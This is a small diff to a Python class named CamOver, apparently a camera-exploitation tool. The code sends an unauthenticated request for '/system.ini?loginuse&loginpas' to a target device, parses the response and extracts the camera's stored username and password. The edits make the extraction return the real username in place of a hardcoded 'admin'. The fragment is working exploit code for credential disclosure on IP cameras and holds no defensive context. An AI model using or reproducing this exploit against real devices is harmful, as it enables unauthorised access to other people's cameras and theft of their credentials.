@@ -35,7 +35,7 @@ class CamOver:
 
         try:
             response = requests.get(
-                f"http://{host}/system.ini?loginuse&loginpas",
+                f"http://{address}/system.ini?loginuse&loginpas",
                 verify=False,
                 timeout=3
             )
@@ -49,4 +49,4 @@ class CamOver:
                 username_index = strings.index(username)
                 password = strings[username_index + 1]
 
-                return 'admin', password
+                return username, password
